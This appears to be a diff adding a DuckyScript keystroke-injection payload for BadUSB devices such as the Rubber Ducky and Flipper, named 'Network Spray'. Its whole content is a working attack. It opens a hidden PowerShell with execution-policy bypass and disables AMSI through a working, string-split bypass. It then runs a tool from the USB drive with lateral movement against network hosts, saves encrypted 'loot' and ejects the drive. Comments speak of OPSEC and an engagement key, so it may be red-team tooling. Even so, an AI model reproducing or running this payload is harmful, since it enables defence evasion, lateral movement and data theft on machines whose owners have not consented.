@@ -1,0 +1,38 @@
+REM ============================================================
+REM TREASURE-HUNTER: Network Spray
+REM ============================================================
+REM Full scan + lateral movement against network hosts
+REM Device: Hak5 Rubber Ducky / O.MG / Flipper BadUSB
+REM Duration: ~15s keystroke + 10min scan + lateral
+REM OPSEC: Medium -- lateral movement generates auth events
+REM ============================================================
+
+REM Wait for USB enumeration
+DELAY 2000
+
+REM Open Run dialog
+GUI r
+DELAY 500
+
+REM Launch hidden PowerShell
+STRING powershell -w hidden -ep bypass -nop
+ENTER
+DELAY 1500
+
+REM AMSI bypass
+STRING $a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true)
+ENTER
+DELAY 500
+
+REM Find USB drive
+STRING $d=(Get-Volume|?{Test-Path "$($_.DriveLetter):\treasure-hunter.exe"}).DriveLetter
+ENTER
+DELAY 300
+
+REM Full scan with lateral movement + output encryption
+STRING if($d){& "$d`:\treasure-hunter.exe" -p triage --lateral --lateral-max-hosts 5 -o "$d`:\loot.jsonl" --encrypt --passphrase 'engagement-key-2024' --html "$d`:\report.html" -q}
+ENTER
+
+REM Wait for completion, then eject
+STRING Start-Sleep -Seconds 660; if($d){(New-Object -ComObject Shell.Application).NameSpace(17).ParseName("$d`:").InvokeVerb('Eject')}; exit
+ENTER
